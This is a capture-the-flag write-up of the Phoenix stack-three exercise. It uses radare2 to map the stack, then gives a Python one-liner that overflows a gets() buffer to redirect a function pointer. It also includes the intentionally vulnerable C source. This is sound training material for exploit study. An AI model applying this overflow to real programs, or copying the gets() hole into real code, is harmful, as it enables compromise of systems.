# Phoenix Stack3
## Static Analysis
##### Analyse the binary
`r2 -A stack-three`
##### Result

  > calling function pointer @ 0x105d0
> Congratulations, you've finished phoenix/stack-three :-) Well done!

##### Learning
In this challenge there were only a few Stack Variables..

```
[0x0001049c]> pd 5 @main
|           ;-- $a:
/ (fcn) main 120
|   main (FILE *stream);
|           ; var int local_54h @ fp-0x54
|           ; var int local_50h @ fp-0x50
|           ; var int local_8h @ fp-0x8
|           ; arg FILE *stream @ r3
```
It was not immediately obvious with `Radare2` which stack variable held the C char buffer.  But if you looked closer at `the Offset` values it would give you a clue that `local_8h` was in fact a `Struct`.  This `Struct` was made up of two values; a char buffer (64) and an integer pointer (8).

```
?vi 0x50 - 0x8
72

After finishing the challenge, you could verify this against the code:

72 = 64 char buffer + 8 for int pointer!

struct {
  char buffer[64];
  volatile int (*fp)();
} locals;
```
##### Familiarity
```
[0x0001049c]> i
file     stack-three
format   elf
arch     arm
endian   little
```
##### Run the code
```
$ ./stack-three
DDDDDDDDD       <- program waiting for input here
function pointer remains unmodified :~( better luck next time!

python -c 'print "A"* 66'

$ ./stack-three
<  66 x 0x41 ('A') >
calling function pointer @ 0x4141
Segmentation fault

// Pro way to pass values to gets()
python -c 'print "A"*(65)' | ./stack-three
calling function pointer @ 0x41
Segmentation fault
```  
##### Exports
```
[0x0001049c]> iE
[Exports]
084 0x000005ec 0x000105ec GLOBAL   FUNC  136 main
090 0x000005d0 0x000105d0 GLOBAL   FUNC   28 complete_level
```
##### Symbols
```
[0x0001049c]> is~FUNC
[Symbols]
090 0x000005d0 0x000105d0 GLOBAL   FUNC   28 complete_level
```
##### Seek and Print complete_level
```
[0x0001049c]> s 0x000105d0


[0x000105d0]> pdf
|           ;-- $a:
/ (fcn) sym.complete_level 24
|   sym.complete_level ();
|           0x000105d0      00482de9       push {fp, lr}
|           0x000105d4      04b08de2       add fp, sp, 4
|           0x000105d8      08009fe5       ldr r0, loc._d_11           ; [0x105e8:4]=0x10680 loc._d_10 ; const char *s
|           0x000105dc      9cffffeb       bl sym.imp.puts             ; int puts(const char *s)
|           0x000105e0      0000a0e3       mov r0, 0                   ; int status
\           0x000105e4      a3ffffeb       bl sym.imp.exit             ; void exit(int status)
```
##### Answer
```
$ python -c 'print "A"*(64) + "\xd0\x05\x01\x00"' | ./stack-three

calling function pointer @ 0x105d0
Congratulations, you've finished phoenix/stack-three :-) Well done!

```
##### Source code
```
* The aim is to change the contents of the changeme variable to 0x0d0a090a
*
* When does a joke become a dad joke?
*   When it becomes apparent.
*   When it's fully groan up.
*
*/

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
 "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
 printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
 exit(0);
}

int main(int argc, char **argv) {
 struct {
   char buffer[64];
   volatile int (*fp)();
 } locals;

 printf("%s\n", BANNER);

 locals.fp = NULL;
 gets(locals.buffer);

 if (locals.fp) {
   printf("calling function pointer @ %p\n", locals.fp);
   fflush(stdout);
   locals.fp();
 } else {
   printf("function pointer remains unmodified :~( better luck next time!\n");
 }

 exit(0);
}
```
